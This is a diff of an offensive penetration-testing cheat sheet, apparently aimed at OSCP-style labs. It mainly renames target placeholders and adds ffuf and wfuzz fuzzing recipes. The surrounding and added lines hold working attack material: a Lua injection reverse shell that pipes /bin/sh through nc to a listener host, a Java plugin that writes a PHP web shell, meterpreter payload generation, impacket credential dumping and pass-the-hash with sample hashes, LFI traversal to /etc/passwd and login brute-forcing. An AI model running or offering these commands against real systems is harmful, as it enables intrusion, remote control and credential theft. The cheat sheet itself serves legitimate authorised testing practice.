@@ -488,13 +488,13 @@ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|ve
 ##### Reverse DNS
 
 ```c
-whois <TARGET_DOMAIN>
+whois <RHOST>
 host <RHOST> <RHOST>
-host -l <TARGET_DOMAIN> <RHOST>
-dig @<RHOST> -x <TARGET_DOMAIN>
-dig {a|txt|ns|mx} <TARGET_DOMAIN>
-dig {a|txt|ns|mx} <TARGET_DOMAIN> @ns1.<TARGET_DOMAIN>
-dig axfr @<RHOST> <TARGET_DOMAIN>    # zone transfer
+host -l <RHOST> <RHOST>
+dig @<RHOST> -x <RHOST>
+dig {a|txt|ns|mx} <RHOST>
+dig {a|txt|ns|mx} <RHOST> @ns1.<RHOST>
+dig axfr @<RHOST> <RHOST>    # zone transfer
 ```
 
 #### ldapsearch
@@ -502,10 +502,10 @@ dig axfr @<RHOST> <TARGET_DOMAIN>    # zone transfer
 ```c
 ldapsearch -x -w <PASSWORD>
 ldapsearch -x -h <RHOST> -s base namingcontexts
-ldapsearch -x -b "dc=<TARGET_DOMAIN>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
-ldapsearch -x -D "cn=admin,dc=<TARGET_DOMAIN>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
+ldapsearch -x -b "dc=<RHOST>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
+ldapsearch -x -D "cn=admin,dc=<RHOST>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
 ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
-ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<TARGET_DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
 #### sslyze
@@ -537,9 +537,9 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 #### Nuclei
 
 ```c
-./nuclei -target https://<TARGET_URL> -t nuclei-templates    # basic syntax with path to templates
-./nuclei -target https://<TARGET_URL> -t nuclei-templates -rate-limit 5    # rate limiting
-./nuclei -target https://<TARGET_URL> -t nuclei-templates -header 'User-Agent: OSCP-EXAM -H 'X-OSCP-EXAM: oscp_exam'    # set headers
+./nuclei -target https://<RHOST> -t nuclei-templates    # basic syntax with path to templates
+./nuclei -target https://<RHOST> -t nuclei-templates -rate-limit 5    # rate limiting
+./nuclei -target https://<RHOST> -t nuclei-templates -header 'User-Agent: OSCP-EXAM -H 'X-OSCP-EXAM: oscp_exam'    # set headers
 ```
 
 ### Web Application Analysis
@@ -553,13 +553,104 @@ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|ht
 #### ffuf
 
 ```c
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_URL>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
+ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
+```
 
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<TARGET_URL>/ -H "Host: FUZZ.<TARGET_URL>" -fs 185
+##### API Fuzzing
 
-ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<TARGET_URL>/backups/backup_2020070416FUZZ.zip
+```c
+ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
+```
 
-ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_URL>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+##### Looging for LFI
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+```
+
+##### Fuzzing with PHP Session ID
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
+```
+
+##### Recursion
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
+```
+
+##### File Extensions
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
+```
+
+##### No 404 Header
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/no404/FUZZ -fs 669
+```
+
+##### Param Mining
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/param/data?FUZZ=1
+```
+
+##### Rate Limiting
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
+```
+
+##### IDOR Testing
+
+```c
+seq 1 1000 | ffuf -w - -u http://<RHOST>/cd/pipes/user?id=FUZZ
+```
+
+###### Script for IDOR Testing
+
+```c
+#!/bin/bash
+
+while read i
+do
+  if [ "$1" == "md5" ]; then
+    echo -n $i | md5sum | awk '{ print $1 }'
+  elif [ "$1" == "b64" ]; then
+    echo -n $i | base64
+  else
+    echo $i
+  fi
+done
+```
+
+###### Use Script above for Base64 decoding
+
+```c
+seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://<RHOST>/cd/pipes/user2?id=FUZZ
+```
+
+###### MD5 Discovery using the Script
+
+```c
+seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://<RHOST>/cd/pipes/user3?id=FUZZ
+```
+
+##### Virtual Host Discovery
+
+```c
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
+```
+
+##### Massive File Extension Discovery
+
+```c
+ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
 ```
 
 #### Gobuster
@@ -573,7 +664,7 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST> -x php,txt,h
 
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 
-gobuster dns -d <TARGET_DOMAIN> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 
 #### Hakrawler
@@ -587,14 +678,14 @@ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
 #### Local File Inclusion (LFI)
 
 ```c
-http://<TARGET_DOMAIN>/<FILE>.php?file=
-http://<TARGET_DOMAIN>/<FILE>.php?file=../../../../../../../../etc/passwd
-http://<TARGET_DOMAIN>/<FILE>/php?file=../../../../../../../../../../etc/passwd
+http://<RHOST>/<FILE>.php?file=
+http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
+http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
 ##### Until php 5.3
 
 ```c
-http://<TARGET_DOMAIN>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
+http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 
 ##### Encoded Traversal Strings
@@ -967,19 +1058,75 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 #### wfuzz
 
 ```c
-wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>:<RPORT>/FUZZ/<FILE>.php --hc '403,404'
+wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
+```
 
-wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<DIRECTORY>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
+##### Write to File
 
-wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<TARGET_URL>" --hc 200 --hw 356 -t 100 <RHOST>
+```c
+wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
+```
 
-wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<wordlist>.txt --hc 200 -c
+##### Custom Scan with limited Output
 
-wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select
+```c
+wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
+```
 
-wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<TARGET_DOMAIN>" -u http://<TARGET_DOMAIN> --hw <value> -t 100
+##### Fuzzing two Parameters at once
 
+```c
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
+```
+
+##### Domain
+
+```c
+wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>.<tld>' -u http://<RHOST>/
+```
+
+##### Subdomain
+
+```c
+wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
+```
+
+##### Git
+
+```c
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
+```
+##### Login
+
+```c
+wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
+wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
+```
+
+##### SQL
+
+```c
+wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
+```
+
+##### DNS
+
+```c
+wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
+wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
+wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
+```
+
+##### Numbering Files
+
+```c
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
+```
+
+##### Enumerating PIDs
+
+```c
+wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
 ```
 
 #### WPScan
@@ -1231,7 +1378,7 @@ $ convert poc.svg poc.png
 ##### General Usage
 
 ```c
-$ sudo msfdb init                  // database initialization
+sudo msfdb init                  // database initialization
 msf6 > search                      // search within metasploit
 msf6 > set RHOST <RHOST>           // set remote host
 msf6 > set RPORT <RPORT>           // set remote port
@@ -1287,7 +1434,7 @@ meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwardi
 ##### Metasploit through Proxychains
 
 ```c
-$ proxychains -q msfconsole
+proxychains -q msfconsole
 ```
 
 ##### Meterpreter Listener
@@ -1295,7 +1442,7 @@ $ proxychains -q msfconsole
 ###### Generate Payload
 
 ```c
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
 ```
 
 ###### Setup Listener for Microsoft Windows
@@ -1315,7 +1462,7 @@ msf6 exploit(multi/handler) > run
 ###### Download Files
 
 ```c
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>exe
 ```
 
 ```c
@@ -1503,65 +1650,65 @@ grep -oiE "password.{20}" /etc/*.conf
 #### Impacket
 
 ```c
-$ impacket-smbserver local . -smb2support
-$ impacket-reg <TARGET_DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
-$ impacket-services <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
-$ impacket-netview <TARGET_DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
-$ impacket-lookupsid <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-$ impacket-GetADUsers -all -dc-ip <RHOST> <TARGET_DOMAIN>/
-$ impacket-getST <TARGET_DOMAIN>/<USERNAME>$  -spn WWW/<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-$ impacket-rpcdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-$ impacket-samrdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-$ impacket-atexec -k -no-pass <TARGET_DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
+impacket-smbserver local . -smb2support
+impacket-reg <RHOST>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
+impacket-services <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
+impacket-netview <RHOST>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
+impacket-lookupsid <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-GetADUsers -all -dc-ip <RHOST> <RHOST>/
+impacket-getST <RHOST>/<USERNAME> -spn WWW/<DOMAIN_CONTROLLER>.<RHOST> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+impacket-rpcdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-samrdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-atexec -k -no-pass <RHOST>/Administrator@<DOMAIN_CONTROLLER>.<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
 ```
 
 ##### impacket-smbclient
 
 ```c
-$ export KRB5CCNAME=<USERNAME>.ccache
-$ impacket-smbclient <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-$ impacket-smbclient -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
 ```
 
 ##### impacket-getTGT
 
 ```c
-$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME>:<PASSWORD>
-$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME> -dc-ip <TARGET_DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
+impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-GetNPUsers
 
 ```c
-$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-$ impacket-GetNPUsers <TARGET_DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
-$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
+impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
+impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
 ```
 
 ##### impacket-getUserSPNs / GetUserSPNs.py
 
 ```c
-$ export KRB5CCNAME=<USERNAME>.ccache
-$ impacket-GetUserSPNs <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
-$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
+./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
 ```
 
 ##### impacket-secretsdump
 
 ```c
-$ export KRB5CCNAME=<USERNAME>.ccache
-$ impacket-secretsdump <TARGET_DOMAIN>/<USERNAME>@<RHOST>
-$ impacket-secretsdump -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass -debug
-$ impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
-$ impacket-secretsdump -dc-ip <RHOST> <TARGET_DOMAIN>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
-$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
+impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
+impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
 ##### impacket-psexec
 
 ```c
-$ impacket-psexec <USERNAME>@<RHOST>
-$ impacket-psexec <TARGET_DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+impacket-psexec <USERNAME>@<RHOST>
+impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 ```
 
 ##### impacket-ticketer
@@ -1573,8 +1720,8 @@ $ impacket-psexec <TARGET_DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404ee
 * Domain-SID
 
 ```c
-$ export KRB5CCNAME=<USERNAME>.ccache
-$ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <TARGET_DOMAIN> -spn MSSQLSVC/<RHOST>.<TARGET_DOMAIN> -user-id 500 Administrator
+export KRB5CCNAME=<USERNAME>.ccache
+impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
 ```
 
 ##### Fixing [-] exceptions must derive from BaseException
@@ -1582,7 +1729,7 @@ $ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-2
 ###### Issue:
 
 ```c
-$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -no-pass -request
+./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] exceptions must derive from BaseException
@@ -1636,9 +1783,9 @@ PS C:\> import-module ./<module / powershell script>
 ##### Check PowerShell Versions
 
 ```c
-$ PS Set-ExecutionPolicy Unrestricted
-$ PS powershell -Command "$PSVersionTable.PSVersion"
-$ PS powershell -c "[Environment]::Is64BitProcess"
+PS Set-ExecutionPolicy Unrestricted
+PS powershell -Command "$PSVersionTable.PSVersion"
+PS powershell -c "[Environment]::Is64BitProcess"
 ```
 
 ##### Start offsec Session
@@ -1726,7 +1873,7 @@ PS C:\> net users <USERNAME>
 ###### Get User List
 
 ```c
-PS C:\> Get-ADUser -Filter * -SearchBase "DC=<TARGET_DOMAIN>,DC=LOCAL"
+PS C:\> Get-ADUser -Filter * -SearchBase "DC=<RHOST>,DC=LOCAL"
 ```
 
 ###### Invoke-Expression File Transfer
@@ -1863,7 +2010,7 @@ public class Main extends JavaPlugin {
 public void onEnable() {
   final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
   try {
-   Files.write(Paths.get("/var/www/<TARGET_DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
+   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
    } catch (IOException e) {
      e.printStackTrace();
    }
@@ -1876,7 +2023,7 @@ public void onEnable() {
 ##### Lua Reverse Shell
 
 ```c
-http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
+http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
 ```
 
 ##### Markdown Reverse Shell
